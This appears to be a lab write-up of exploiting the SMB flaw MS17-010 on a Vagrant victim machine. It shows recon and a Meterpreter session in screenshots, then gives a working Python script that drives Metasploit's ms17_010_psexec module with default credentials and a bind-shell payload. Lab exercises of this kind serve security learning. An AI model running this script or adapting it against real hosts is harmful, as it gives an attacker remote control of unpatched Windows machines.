# Phase 1: SMB Exploitation (MS17-010)

---

## 🔧 1. Setup & Connectivity

<figure>
  <img src="https://github.com/user-attachments/assets/cca43334-a559-442a-8eb4-88bc9f4b22f2" alt="Victim machine IPv4 configuration" width="600" />
  <figcaption><em>Victim machine IPv4 configuration</em></figcaption>
</figure>

Verify reachability from the attacker (WSL 2):

<figure>
  <img src="https://github.com/user-attachments/assets/6fac6f6c-f931-4570-835c-a4fd2d1a0ac3" alt="Ping response from victim" width="600" />
  <figcaption><em>Ping response from victim</em></figcaption>
</figure>

---

## 🔍 2. Reconnaissance

Scan for common ports &amp; service versions:

<figure>
  <img src="https://github.com/user-attachments/assets/bb43602a-ad0e-4e1e-a0df-13f2592c8e24" alt="Nmap service/version scan" width="600" />
  <figcaption><em>Nmap service/version scan</em></figcaption>
</figure>

---

## 🚀 3. Exploitation

### 3.1 Manual MS17-010 Exploit

Use Metasploit’s `ms17_010_psexec` to drop a Meterpreter shell:

<figure>
  <img src="https://github.com/user-attachments/assets/8d4a5dba-2f81-4d5c-86d4-5930c6d25f28" alt="Meterpreter session established" width="600" />
  <figcaption><em>Meterpreter session established</em></figcaption>
</figure>

List remote files and folders:

<figure>
  <img src="https://github.com/user-attachments/assets/2697bd9d-0f3b-4c5b-8751-a8717859aa09" alt="Listing files and folders" width="600" />
  <figcaption><em>Listing files and folders</em></figcaption>
</figure>

Confirm victim IP inside the shell:

<figure>
  <img src="https://github.com/user-attachments/assets/bb15974b-28f4-4dfd-ae2c-f143819968cb" alt="ipconfig on victim" width="600" />
  <figcaption><em><code>ipconfig</code> output matches victim’s IPv4</em></figcaption>
</figure>

---

### 3.2 Automated Exploit Script

Save the following as `ms17Attack.py` and run it on the attacker:

```python
#!/usr/bin/env python3
import pexpect

MSF_PATH = "/usr/bin/msfconsole"   # no --no-color here
PROMPT   = r"> "                   # match any trailing “>␣”

commands = [
    "use exploit/windows/smb/ms17_010_psexec",
    "set RHOSTS 192.168.0.14",
    "set SMBUser vagrant",
    "set SMBPass vagrant",
    "set PAYLOAD windows/x64/meterpreter/bind_tcp",
    "set LPORT 4444",
    "run"
]

child = pexpect.spawn(MSF_PATH, encoding="utf-8", timeout=120)
child.expect(PROMPT)

for cmd in commands:
    child.sendline(cmd)
    child.expect(PROMPT)

child.interact()
